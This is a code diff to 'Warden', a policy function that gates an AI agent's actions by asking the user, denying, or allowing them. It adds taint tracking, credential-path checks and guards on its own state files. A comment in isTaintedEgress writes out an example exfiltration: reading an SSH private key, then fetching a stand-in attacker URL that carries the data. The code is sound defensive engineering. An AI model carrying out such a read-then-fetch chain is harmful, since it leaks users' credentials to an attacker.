@@ -1,27 +1,38 @@
 /**
  * The Warden policy: one pure function from an ActionRequest to a Decision.
  *
- * Layering, first match wins:
+ * Order, first match wins:
  *   1. system invariants — not overridable by rules, grants or envelopes
- *   2. grants            — exact match; a sensitive off-host payload only
- *                          accepts payload- or recipient-bound grants
- *   3. new-recipient rule — sensitive data to a recipient with no grant ⇒ ask
- *   4. user rules        — replace the interactive default; never loosen the
- *                          taint / remote-origin / corrupt-rules floor
- *   5. default matrix
+ *   2. a user rule of "handoff"
+ *   3. grants — narrowed by what the request is: a guarded command or an
+ *      explicit "ask" rule accepts only the grant for this exact payload;
+ *      sensitive or tainted egress accepts only payload- or target-bound
+ *      grants; a tainted side effect accepts no tool-wide grant
+ *   4. forced asks — things that ask whatever the matrix says (new recipient
+ *      of sensitive data, tainted egress, credential paths, …)
+ *   5. user rules, then the default matrix, then the context floor
  *
  * No I/O, no clock other than `ctx.now`, no model. Every path returns a
  * Decision; anything this function does not recognise resolves to "ask".
  */
 import path from "node:path";
-import { matchGrants, type StoredGrant } from "./grants.js";
-import { LOCKED_CATEGORIES, ruleFor, strictness, type WardenRules } from "./rules.js";
-import { originColumn } from "./types.js";
+import { matchGrants, scopeProblem, type MatchOptions, type StoredGrant } from "./grants.js";
+import { isInsideProtected } from "./paths.js";
+import {
+  LOCKED_CATEGORIES,
+  matchRules,
+  ownBehavior,
+  strictness,
+  type MatchedRule,
+  type WardenRules,
+} from "./rules.js";
+import { GRANT_SCOPES, originColumn } from "./types.js";
 import type {
   ActionCategory,
   ActionRequest,
   DataClass,
   Decision,
+  GrantScope,
   OriginColumn,
   RuleBehavior,
   TaskEnvelope,
@@ -42,11 +53,23 @@ export interface PolicyContext {
 export interface PolicyResult extends Decision {
   /** Grants the caller must record as used (and consume, for "once") before acting. */
   grantIds?: string[];
+  /** For an "ask": the scopes the approver may choose from. */
+  scopes?: GrantScope[];
+  /** For an "ask": a "24h" approval is bound to the request's targets. */
+  bindTargets?: boolean;
 }
 
-/** Categories with no effect outside Lisa's own home. Always "auto" by default. */
+/** Categories with no effect outside Lisa's own home. "auto" by default. */
 const BENIGN: ReadonlySet<ActionCategory> = new Set(["read", "self", "draft"]);
 const SENSITIVE: ReadonlySet<DataClass> = new Set(["pii", "secret", "private-message"]);
+/** Side effects a tool-wide grant must not cover once the run is tainted. */
+const NO_BLANKET_WHEN_TAINTED: ReadonlySet<ActionCategory> = new Set([
+  "exec",
+  "network",
+  "send",
+  "publish",
+  "delete",
+]);
 
 function isBenign(category: ActionCategory): boolean {
   return BENIGN.has(category);
@@ -55,16 +78,6 @@ function isBenign(category: ActionCategory): boolean {
 /** Which column of the default matrix this request falls in. */
 function columnOf(req: ActionRequest): OriginColumn {
   return originColumn(req.origin);
-}
-
-/** The person at the keyboard of their own machine, in an attended turn. */
-function isLocalOwnerChat(req: ActionRequest): boolean {
-  return (req.surface === "cli" || req.surface === "local-web") && columnOf(req) === "chat";
-}
-
-function insidePath(parent: string, child: string): boolean {
-  const rel = path.relative(path.resolve(parent), path.resolve(child));
-  return rel === "" || (!rel.startsWith("..") && !path.isAbsolute(rel));
 }
 
 /** Sensitive data leaving the host: the request must be covered by a bound grant. */
@@ -77,6 +90,25 @@ function needsRecipientGrant(req: ActionRequest): boolean {
   // An off-host READ (a fetch) only trips on credentials in the request itself
   // — the exfiltration shape — not on an address someone asked to look up.
   return req.egress === true && isBenign(req.category) && classes.includes("secret");
+}
+
+/**
+ * Tainted egress: in a run that has read untrusted content, an off-host
+ * request to a destination the request itself names — a URL to fetch, a page
+ * to ingest — is how data leaves (`read ~/.ssh/id_ed25519`, then
+ * `web_fetch https://evil.example/?d=…`). It is let through only when the
+ * exact URL already appeared in the conversation, so the model did not compose
+ * it. A search query goes to the search provider, not to a host the page
+ * picked, so "fixed" destinations are exempt.
+ */
+function isTaintedEgress(req: ActionRequest): boolean {
+  return (
+    req.tainted &&
+    req.egress === true &&
+    req.destination === "chosen" &&
+    isBenign(req.category) &&
+    req.destinationKnown !== true
+  );
 }
 
 /**
@@ -96,17 +128,17 @@ export function defaultBehavior(req: ActionRequest): RuleBehavior {
     return column === "chat" && !req.tainted ? "auto" : "ask";
   }
   if (category === "write" || category === "exec") {
-    const confinedToWorkspace = req.sandboxed;
-    if (confinedToWorkspace) {
+    // Confined by the OS sandbox to the workspace: the blast radius is bounded.
+    if (req.sandboxed) {
       if (column === "task") return "preapproved";
       return column === "chat" && !req.tainted ? "auto" : "ask";
     }
-    // Unconfined. A write that leaves the workspace always asks. Unsandboxed
-    // exec — and a workspace write the same unsandboxed shell could make
-    // anyway — stays "auto" only for the local owner in an untainted attended
-    // turn (today's daily-driver behaviour under danger-full-access).
-    if (category === "write" && req.withinWorkspace !== true) return "ask";
-    return isLocalOwnerChat(req) && !req.tainted ? "auto" : "ask";
+    // Not confined. An unsandboxed shell — or a file write with no sandbox
+    // behind it — can do anything every other tool can, so letting it run
+    // unasked would make every other "ask" advisory. It asks for every origin,
+    // the local owner included; a user who wants the old behaviour says so
+    // with a rule.
+    return "ask";
   }
   return "ask";
 }
@@ -118,10 +150,7 @@ export function defaultBehavior(req: ActionRequest): RuleBehavior {
  * than "ask" — tasks read the web as a matter of course, and what keeps them
  * safe is that only the envelope the user approved can cover the action.
  */
-function floorFor(
-  req: ActionRequest,
-  ctx: PolicyContext,
-): { behavior: RuleBehavior; ruleId: string } {
+function floorFor(req: ActionRequest, ctx: PolicyContext): MatchedRule {
   if (isBenign(req.category)) return { behavior: "auto", ruleId: "" };
   if (ctx.rulesCorrupt) return { behavior: "ask", ruleId: "system:rules-corrupt" };
   const column = columnOf(req);
@@ -141,12 +170,21 @@ export function envelopeCovers(req: ActionRequest, envelope: TaskEnvelope | unde
   const offHost =
     req.category === "network" || req.category === "send" || req.category === "publish";
   if (envelope.targets !== undefined) {
-    if (req.targets.length === 0) return !offHost;
+    if (req.targets.length === 0 || req.targetsComplete === false) return !offHost;
     return req.targets.every((target) => envelope.targets!.includes(target));
   }
   // No target list: fine for confined local work, but a tainted run may only
   // reach off-host targets the envelope named (simplified tainted egress).
   return !(offHost && req.tainted);
+}
+
+function touchesProtected(req: ActionRequest, ctx: PolicyContext): boolean {
+  if (!ctx.protectedPaths || ctx.protectedPaths.length === 0) return false;
+  return req.targets.some(
+    (target) =>
+      path.isAbsolute(target) &&
+      ctx.protectedPaths!.some((protectedPath) => isInsideProtected(protectedPath, target)),
+  );
 }
 
 function systemInvariant(req: ActionRequest, ctx: PolicyContext): Decision | null {
@@ -162,7 +200,7 @@ function systemInvariant(req: ActionRequest, ctx: PolicyContext): Decision | nul
       ruleId: "system:autonomy-read-only",
     };
   }
-  const locked = LOCKED_CATEGORIES[req.category];
+  const locked = ownBehavior(LOCKED_CATEGORIES, req.category);
   if (locked === "handoff") {
     return {
       verdict: "handoff",
@@ -181,7 +219,7 @@ function systemInvariant(req: ActionRequest, ctx: PolicyContext): Decision | nul
         ruleId: "system:cloud-no-exec",
       };
     }
-    if (req.category === "write" && !req.connector) {
+    if ((req.category === "write" || req.category === "delete") && !req.connector) {
       return {
         verdict: "deny",
         reason: "Host file writes are not available on the hosted edition.",
@@ -189,7 +227,7 @@ function systemInvariant(req: ActionRequest, ctx: PolicyContext): Decision | nul
       };
     }
   }
-  if (req.category === "write" && touchesProtected(req, ctx)) {
+  if ((req.category === "write" || req.category === "delete") && touchesProtected(req, ctx)) {
     return {
       verdict: "deny",
       reason: "Warden's own rules, grants and audit files cannot be modified by a tool call.",
@@ -197,15 +235,6 @@ function systemInvariant(req: ActionRequest, ctx: PolicyContext): Decision | nul
     };
   }
   return null;
-}
-
-function touchesProtected(req: ActionRequest, ctx: PolicyContext): boolean {
-  if (!ctx.protectedPaths || ctx.protectedPaths.length === 0) return false;
-  return req.targets.some(
-    (target) =>
-      path.isAbsolute(target) &&
-      ctx.protectedPaths!.some((protectedPath) => insidePath(protectedPath, target)),
-  );
 }
 
 function finalize(req: ActionRequest, result: PolicyResult): PolicyResult {
@@ -221,6 +250,122 @@ function finalize(req: ActionRequest, result: PolicyResult): PolicyResult {
   return result;
 }
 
+/**
+ * The user's rule for the request, resolved against a fallback. A target rule
+ * that covers every target is the most specific and wins outright; one that
+ * covers only part of the targets can tighten but never loosen, and then the
+ * stricter of the tool and category rules is the base.
+ */
+function resolveRule(
+  rules: WardenRules,
+  req: ActionRequest,
+  fallback: MatchedRule,
+): MatchedRule & { explicit: boolean } {
+  const match = matchRules(rules, req);
+  if (match.target && match.targetsCovered) return { ...match.target, explicit: true };
+  const base = match.target ? match.strictBase : match.base;
+  let chosen = base ?? fallback;
+  let explicit = base !== undefined;
+  if (match.target && strictness(match.target.behavior) > strictness(chosen.behavior)) {
+    chosen = match.target;
+    explicit = true;
+  }
+  return { ...chosen, explicit };
+}
+
+/** What makes this request ask regardless of the matrix, if anything. */
+interface Forced {
+  ruleId: string;
+  reason: string;
+  /** Scopes an approver may choose. */
+  scopes: GrantScope[];
+  /** Which grants may stand in for an approval. */
+  grants: MatchOptions["mode"];
+  bindTargets?: boolean;
+}
+
+function forcedAsk(req: ActionRequest, ctx: PolicyContext): Forced | null {
+  if (req.guarded === true || (req.category === "exec" && touchesProtected(req, ctx))) {
+    return {
+      ruleId: "system:warden-state-guard",
+      reason: "This command refers to Warden's own state files or approval API.",
+      scopes: ["once"],
+      grants: "once",
+    };
+  }
+  if (needsRecipientGrant(req)) {
+    return {
+      ruleId: "system:new-recipient-sensitive-data",
+      reason: "This sends personal or secret data to a recipient you have not approved before.",
+      scopes: ["once", "target"],
+      grants: "bound",
+    };
+  }
+  if (isTaintedEgress(req)) {
+    return {
+      ruleId: "system:tainted-egress",
+      reason:
+        "This conversation has read untrusted content, and this request goes to an address " +
+        "that did not appear in it — data could leave this way.",
+      scopes: ["once", "target", "24h"],
+      grants: "bound",
+      bindTargets: true,
+    };
+  }
+  if (req.category === "read" && req.sensitivePath === true) {
+    return {
+      ruleId: "system:credential-path",
+      reason: "This reads a location that holds credentials.",
+      scopes: ["once", "target"],
+      grants: "bound",
+    };
+  }
+  if (req.category === "read" && req.tainted && touchesHostPath(req) && !req.withinWorkspace) {
+    return {
+      ruleId: "system:tainted-read-outside-workspace",
+      reason:
+        "This conversation has read untrusted content, and this reads a file outside the workspace.",
+      scopes: ["once", "target"],
+      grants: "bound",
+    };
+  }
+  if (req.tainted && req.tool === "skill_manage" && req.category === "self") {
+    return {
+      ruleId: "system:tainted-skill-write",
+      reason:
+        "This conversation has read untrusted content, and a skill can change what Lisa does later.",
+      scopes: ["once"],
+      grants: "once",
+    };
+  }
+  return null;
+}
+
+/** A read of a file on this machine (as opposed to a search or a fetch). */
+function touchesHostPath(req: ActionRequest): boolean {
+  return req.targets.length > 0 && req.targets.every((target) => path.isAbsolute(target));
+}
+
+/** The scopes an approver may choose for an ordinary (not forced) ask. */
+function offeredScopes(req: ActionRequest, explicitAsk: boolean): GrantScope[] {
+  if (explicitAsk) return ["once"];
+  return GRANT_SCOPES.filter((scope) => {
+    if (scopeProblem(req, scope) !== null) return false;
+    // A standing grant on a shell, or one given while the run is tainted, is
+    // how one click turns every later command into "auto".
+    if ((scope === "always" || scope === "24h") && (req.category === "exec" || req.tainted)) {
+      return false;
+    }
+    // What a command touches cannot be enumerated, so it has no target to bind.
+    if (scope === "target" && req.category === "exec") return false;
+    return true;
+  });
+}
+
+function applicable(req: ActionRequest, scopes: GrantScope[]): GrantScope[] {
+  return scopes.filter((scope) => scopeProblem(req, scope) === null);
+}
+
 /** Decide one action. Pure. */
 export function evaluate(req: ActionRequest, ctx: PolicyContext): PolicyResult {
   const now = ctx.now ?? Date.now();
@@ -228,11 +373,17 @@ export function evaluate(req: ActionRequest, ctx: PolicyContext): PolicyResult {
   const invariant = systemInvariant(req, ctx);
   if (invariant) return finalize(req, invariant);
 
+  // The untainted default, so that when taint is what forces the ask, the
+  // floor below — not a generic default — is recorded as the reason.
+  const fallback: MatchedRule = {
+    behavior: defaultBehavior({ ...req, tainted: false }),
+    ruleId: `default:${req.category}`,
+  };
+  const user = resolveRule(ctx.rules, req, fallback);
+
   // A "handoff" rule is the user saying "never do this for me". No approval
-  // could have been given under it, so a grant that predates the rule does not
-  // outrank it.
-  const user = ruleFor(ctx.rules, req);
-  if (user?.behavior === "handoff") {
+  // could have been given under it, so no grant outranks it.
+  if (user.explicit && user.behavior === "handoff") {
     return finalize(req, {
       verdict: "handoff",
       reason: "Your rules hand this kind of action back to you.",
@@ -240,14 +391,19 @@ export function evaluate(req: ActionRequest, ctx: PolicyContext): PolicyResult {
     });
   }
 
-  const sensitiveEgress = needsRecipientGrant(req);
-  // A shell command the caller flagged as naming Warden's state or approval
-  // API. The flag is a string heuristic, so it asks (every time, for this
-  // exact command) rather than denies: a developer grepping their own checkout
-  // for "/api/approvals" must still be able to say yes.
-  const guardedExec = req.category === "exec" && touchesProtected(req, ctx);
+  const forced = forcedAsk(req, ctx);
+  // A user rule stricter than a grant wins, whichever is newer: under an
+  // explicit "ask" only the approval of this exact payload counts.
+  const explicitAsk = user.explicit && user.behavior === "ask";
+  const mode: MatchOptions["mode"] =
+    forced?.grants === "once" || explicitAsk ? "once" : (forced?.grants ?? "any");
   const granted = matchGrants(req, ctx.grants, now, {
-    boundOnly: sensitiveEgress || guardedExec,
+    mode,
+    // Tool-wide "always" / "24h" grants do not survive taint for side effects.
+    noBlanket:
+      req.tainted &&
+      (NO_BLANKET_WHEN_TAINTED.has(req.category) ||
+        (req.category === "write" && req.withinWorkspace !== true)),
   });
   if (granted) {
     return finalize(req, {
@@ -258,35 +414,36 @@ export function evaluate(req: ActionRequest, ctx: PolicyContext): PolicyResult {
     });
   }
 
-  if (guardedExec) {
-    return finalize(req, {
-      verdict: "ask",
-      reason: "This command refers to Warden's own state files or approval API.",
-      ruleId: "system:warden-state-guard",
-    });
+  if (forced) {
+    // A user rule can stand in for a grant on the two egress checks: an
+    // explicit "auto" that covers every target (or the tool) is the user
+    // saying this destination is fine. It never unlocks a guarded command or
+    // a credential path named only by a tool-wide rule.
+    const ruleCovers =
+      user.explicit &&
+      user.behavior === "auto" &&
+      forced.ruleId === "system:tainted-egress" &&
+      !ctx.rulesCorrupt;
+    if (!ruleCovers) {
+      return finalize(req, {
+        verdict: "ask",
+        reason: forced.reason,
+        ruleId: forced.ruleId,
+        scopes: explicitAsk ? ["once"] : applicable(req, forced.scopes),
+        bindTargets: forced.bindTargets,
+      });
+    }
   }
 
-  if (sensitiveEgress) {
-    return finalize(req, {
-      verdict: "ask",
-      reason: "This sends personal or secret data to a recipient you have not approved before.",
-      ruleId: "system:new-recipient-sensitive-data",
-    });
-  }
-
-  // The untainted default, so that when taint is what forces the ask, the
-  // floor below — not a generic default — is recorded as the reason.
-  let behavior = defaultBehavior({ ...req, tainted: false });
-  let ruleId = `default:${req.category}`;
-  if (user) {
-    behavior = user.behavior;
-    ruleId = user.ruleId;
-  }
+  let { behavior, ruleId } = user;
   const floor = floorFor(req, ctx);
   if (strictness(floor.behavior) > strictness(behavior)) {
     behavior = floor.behavior;
     ruleId = floor.ruleId;
   }
+
+  const ask = (reason: string): PolicyResult =>
+    finalize(req, { verdict: "ask", reason, ruleId, scopes: offeredScopes(req, explicitAsk) });
 
   switch (behavior) {
     case "auto":
@@ -299,11 +456,7 @@ export function evaluate(req: ActionRequest, ctx: PolicyContext): PolicyResult {
           ruleId: "envelope",
         });
       }
-      return finalize(req, {
-        verdict: "ask",
-        reason: "This action was not pre-approved for the task.",
-        ruleId,
-      });
+      return ask("This action was not pre-approved for the task.");
     case "handoff":
       return finalize(req, {
         verdict: "handoff",
@@ -312,7 +465,7 @@ export function evaluate(req: ActionRequest, ctx: PolicyContext): PolicyResult {
       });
     case "ask":
     default:
-      return finalize(req, { verdict: "ask", reason: askReason(req, ruleId), ruleId });
+      return ask(askReason(req, ruleId));
   }
 }
 
@@ -326,8 +479,14 @@ function askReason(req: ActionRequest, ruleId: string): string {
   if (ruleId === "system:rules-corrupt") {
     return "Your Warden rules file could not be read, so side effects need your approval.";
   }
+  if (req.category === "exec" && !req.sandboxed) {
+    return "This runs a command with no sandbox around it.";
+  }
   if (req.category === "write" && req.withinWorkspace !== true) {
     return "This writes outside the workspace.";
+  }
+  if (req.category === "write" && !req.sandboxed) {
+    return "This writes a file with no sandbox around it.";
   }
   return `"${req.category}" actions need your approval.`;
 }
